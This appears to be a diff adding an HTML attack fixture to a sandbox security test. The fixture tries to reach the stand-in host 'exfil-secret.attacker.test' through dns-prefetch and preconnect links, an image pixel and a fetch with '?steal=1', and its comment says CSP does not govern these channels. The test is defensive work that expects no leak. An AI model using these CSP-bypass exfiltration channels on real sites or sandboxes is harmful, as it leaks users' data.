@@ -1,0 +1,39 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: DNS / speculative connection to a hostname</title>
+<!-- ATTACK (the CSP-ungoverned channels): CSP does not govern
+     <link rel="dns-prefetch"> or rel="preconnect", and webRequest never sees
+     DNS resolution. This is the classic "our canary was HTTP-shaped so we never
+     considered DNS" hole. The thing points an attacker HOSTNAME (not an IP) at
+     these channels plus a control fetch/img. The test maps that hostname
+     straight at the canary via host-resolver-rules, so any connection that
+     leaked past the dead proxy / connect-src would land on the canary and be
+     seen. It must stay silent. -->
+<script>
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
+  const host = 'exfil-secret.attacker.test';
+  const r = { attack: 'dns-prefetch', host };
+
+  function addLink(rel) {
+    const l = document.createElement('link');
+    l.rel = rel;
+    l.href = 'http://' + host + '/';
+    document.documentElement.appendChild(l);
+  }
+  addLink('dns-prefetch');
+  addLink('preconnect');
+
+  const img = new Image();
+  img.onerror = () => {};
+  img.src = 'http://' + host + '/pixel.gif?steal=1';
+
+  (async () => {
+    try {
+      const res = await fetch('http://' + host + '/beacon?steal=1');
+      r.fetchResolved = res.ok;
+    } catch (e) {
+      r.fetchError = String(e);
+    }
+    setTimeout(() => window.bridge.emit('done', r), 1800);
+  })();
+</script>
